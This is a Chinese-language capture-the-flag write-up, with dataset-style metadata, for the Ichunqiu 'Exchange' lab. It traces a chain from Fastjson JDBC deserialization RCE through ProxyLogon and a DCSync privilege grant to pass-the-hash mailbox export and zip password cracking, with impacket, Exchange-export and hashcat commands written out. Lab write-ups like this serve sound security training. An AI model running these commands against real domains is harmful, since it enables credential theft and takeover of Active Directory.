---
title: Ichunqiu 云境 —— Exchange Writeup
contest: Ichunqiu 云境
year: 2022
difficulty: hard
vuln_type: web_unknown
tags: [OSCP, Fastjson JDBC, Proxylogon, NTLM Relay, Coerce Auth, DCSync]
attack_chain: |
  1. 入口 (172.22.3.12): Nmap 80/8000 端口 → 8000 是华夏 ERP → Fastjson 高版本 JDBC 反序列化 → MySQL_Fake_Server 配合未授权 + MySQL Connector JDBC 反序列化组合拳 → RCE Flag01
  2. 内网 172.22.3.9 Exchange: Proxylogon (CVE-2021-26855) 直接打死 → system 权限 Flag02
  3. 凭据收集: exchange 机器账户 hash (机器账户对 domain-object 有 writedacl) + 域账户 Zhangtong
  4. NTLM Relay 中继: exchange system 触发 webdav 回连 → 中继到 ldap → 给 Zhangtong 加 dcsync 权限
  5. DCSync 获取域管 + lumia 用户 hash → 横向 172.22.3.2 Flag04
  6. 172.22.3.26 Lumia 用户文件夹: secret.zip + PTH Exchange 导出 mailbox → item-0.eml 提示密码是手机号 → csv 附件手机号字典 → pkzip hashcat 跑出密码 → Flag03
key_payload: |
  # Fastjson JDBC 反序列化 (华夏 ERP 8000 端口):
  # MySQL_Fake_Server 配置 + 触发 MySQL Connector 加载远程 jar 反序列化
  
  # Proxylogon (CVE-2021-26855) Exchange 拿下 system:
  # 直接利用公开 PoC 打 172.22.3.9
  
  # DACLSync 提权 (NTLM Relay 替代方案):
  dacledit.py -action write -rights DCSync -principal Zhangtong -target-dn "DC=pentest,DC=me" pentest.me/Zhangtong:password
  
  # DCSync 拿所有域管 hash:
  secretsdump.py pentest.me/Zhangtong:password@172.22.3.3 -just-dc-user krbtgt
  
  # PTH Exchange 导出 Lumia 邮件:
  python ExchangeMailboxExport.py --server 172.22.3.9 --user lumia --hash :NTLMHASH --output ./emails/
  
  # PKZIP hash 跑字典:
  zip2john secret.zip > secret.hash
  hashcat -m 17210 -a 0 secret.hash rockyou.txt
one_liner: OSCP 风格渗透：Fastjson JDBC RCE → Exchange Proxylogon → NTLM Relay DCSync → 邮箱导出 PKZIP 跑字典。
lesson: |
  - Fastjson 高版本反序列化需要走 JDBC (MySQL/PostgreSQL/H2) 触发链
  - Proxylogon (CVE-2021-26855) 是 2021 Exchange 最经典 SSRF + 任意文件写 RCE
  - Exchange 机器账户对 domain-object 有 writedacl → dcsync 是常见 AD 提权路径
  - PTH + 邮件导出是 2022 OSCP 风格渗透标志
  - PKZIP 已知明文 + 字典是最后 zip 解密的"标准答案"
quality: high
---

# Ichunqiu 云境 —— Exchange Writeup

> 来源: ctfiot.com 101057 - Gcow 安全团队 小离

## 0x00 Intro

- OSCP 渗透风格，脱离 C2 和 MSF 工具
- 难度不高

## 0x01 Info

- Tag: JDBC, Exchange, NTLM, Coerce Authentication, DCSync

## 0x02 Recon

- Target: 39.98.179.149
- 重点端口 8000 (华夏 ERP)
- Fastjson 高版本 JDBC 反序列化 (参考 Bmth666 蓝帽杯 2022 决赛季军赛 wp)
- MySQL_Fake_Server + 未授权 + MySQL Connector JDBC 反序列化组合拳 → RCE → **Flag01**

## 0x03 入口点 172.22.3.12 (Exchange EXC01)

1. SMB 扫描内网，看到 Exchange 关键字 → 172.22.3.9 = Exchange
2. Proxylogon (CVE-2021-26855) 直接打 → system 权限 → **Flag02**

## 0x04 入口点 172.22.3.9

- 已收集 Exchange 机器账户 hash（机器账户对 domain-object 有 writedacl）
- 已收集域账户凭据 Zhangtong

**NTLM Relay 中继（推荐）** vs 直接 DACLSync：

```bash
# 方案 1: dacledit.py 直接加 DCSync 权限
dacledit.py -action write -rights DCSync -principal Zhangtong \
    -target-dn "DC=pentest,DC=me" pentest.me/Zhangtong:password

# 方案 2: Exchange system 触发 webdav 回连 → NTLM Relay 中继到 ldap
# 作者没走这条路，建议参考 Spoofing 文章
```

DCSync 拿域管 + lumia hash → 横向 172.22.3.2 → **Flag04**

## 0x05 Final 172.22.3.26

1. Lumia 用户文件夹下 `secret.zip` 加密
2. **PTH Exchange 导出 Lumia mailbox 全部邮件及附件**（`ExchangeMailboxExport.py`）
3. `item-0.eml` 提示密码是手机号
4. 邮件附件 csv 含手机号字典
5. `zip2john secret.zip > secret.hash` + `hashcat -m 17210` 跑出密码
6. **Flag03**

## 0x06 Outro

- Exchange 后渗透本意 NTLM Relay → DCSync，作者走 DACLSync 偷懒
- Lumia 用户改密本意是常规步骤，作者 PTH 直接绕过

## 评价

OSCP 风格渗透复刻：Fastjson JDBC RCE + Exchange Proxylogon + NTLM Relay + DCSync + 邮件导出 + PKZIP 跑字典。

每一步都点到 OSCP 实战会用到的工具链 (impacket / ExchangeMailboxExport / hashcat / zip2john)，适合作为 OSCP 备考 AD 链的复盘材料。
